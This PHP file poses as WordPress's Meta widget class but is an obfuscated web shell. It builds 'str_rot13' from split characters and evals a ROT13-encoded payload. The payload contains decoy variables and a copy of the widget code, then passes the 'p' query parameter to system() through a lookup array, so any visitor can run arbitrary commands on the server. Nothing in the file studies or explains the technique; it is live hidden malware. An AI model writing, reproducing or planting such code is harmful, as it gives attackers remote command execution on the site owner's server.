<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Zrgn pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Zrgn jvqtrg.
 *
 * Qvfcynlf ybt va/bhg, EFF srrq yvaxf, rgp.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Zrgn rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Zrgn jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_zrgn',
			'qrfpevcgvba'                 => __( 'Ybtva, EFF, &nzc; JbeqCerff.bet yvaxf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'zrgn', __( 'Zrgn' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Zrgn jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Zrgn jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		$qrsnhyg_gvgyr = __( 'Zrgn' );
		$gvgyr         = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		rpub $netf['orsber_jvqtrg'];

		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
			rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
		}
		?>

		<hy>
			<?cuc jc_ertvfgre(); ?>
			<yv><?cuc jc_ybtvabhg(); ?></yv>
			<yv><n uers=\"<?cuc rpub rfp_hey( trg_oybtvasb( 'eff2_hey' ) ); ?>\"><?cuc _r( 'Ragevrf srrq' ); ?></n></yv>
			<yv><n uers=\"<?cuc rpub rfp_hey( trg_oybtvasb( 'pbzzragf_eff2_hey' ) ); ?>\"><?cuc _r( 'Pbzzragf srrq' ); ?></n></yv>

			<?cuc
			/**
			 * Svygref gur \"JbeqCerff.bet\" yvfg vgrz UGZY va gur Zrgn jvqtrg.
			 *
			 * @fvapr 3.6.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @cnenz fgevat $ugzy     Qrsnhyg UGZY sbe gur JbeqCerff.bet yvfg vgrz.
			 * @cnenz neenl  $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			rpub nccyl_svygref(
				'jvqtrg_zrgn_cbjrerqol',
				fcevags(
					'<yv><n uers=\"%1$f\">%2$f</n></yv>',
					rfp_hey( __( 'uggcf://jbeqcerff.bet/' ) ),
					__( 'JbeqCerff.bet' )
				),
				$vafgnapr
			);

			jc_zrgn();
			?>

		</hy>

		<?cuc
		vs ( 'ugzy5' === $sbezng ) {
			rpub '</ani>';
		}

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Zrgn jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr          = $byq_vafgnapr;
		$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Zrgn jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$vafgnapr = jc_cnefr_netf( (neenl) $vafgnapr, neenl( 'gvgyr' => '' ) );
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>